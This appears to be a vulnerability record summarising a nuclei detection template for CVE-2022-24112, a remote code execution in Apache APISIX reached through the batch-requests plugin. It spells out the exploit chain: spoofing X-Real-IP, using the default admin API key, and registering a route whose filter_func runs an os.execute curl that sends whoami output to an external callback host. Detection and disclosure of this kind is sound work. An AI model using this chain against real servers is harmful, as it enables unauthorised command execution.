---
cve_id: CVE-2022-24112
template_path: nuclei-templates/http/cves/2022/CVE-2022-24112.yaml
affected_product: Apache APISIX
severity: critical
authentication: none
external_callback: true
affected_versions: prior to 2.10.4 and 2.12.1
preconditions: default configuration with batch-requests plugin enabled and default admin API key
poc_classification: rce
---

## Vulnerability
A default configuration of Apache APISIX (with default API key) is vulnerable to remote code execution. An attacker can abuse the batch-requests plugin to bypass IP restrictions on the Admin API by spoofing X-Real-IP and using the default key. A bug in the plugin's client-IP check allows this bypass. When the admin key or Admin API port differs from the data plane, impact is reduced but IP bypass risk remains. Successful exploitation enables arbitrary command execution via malicious route filter_func.

## PoC / Detection
Classification: rce

The template sends a POST to `/apisix/batch-requests` containing a pipeline with a PUT to `/apisix/admin/routes/index?api_key=edd1c9f034335f136f87ad84b625c8f1` that registers a route `/api/{{randstr}}` whose `filter_func` runs `os.execute('curl {{interactsh-url}}/`whoami`')`. A follow-up GET to the new route triggers the payload. Detection matches `"reason":"OK"` + `"status":200` in the batch response body plus an HTTP interactsh callback confirming execution.

## References
- https://www.openwall.com/lists/oss-security/2022/02/11/3
- https://twitter.com/sirifu4k1/status/1496043663704858625
- https://apisix.apache.org/zh/docs/apisix/plugins/batch-requests
- https://nvd.nist.gov/vuln/detail/CVE-2022-24112
- http://www.openwall.com/lists/oss-security/2022/02/11/3
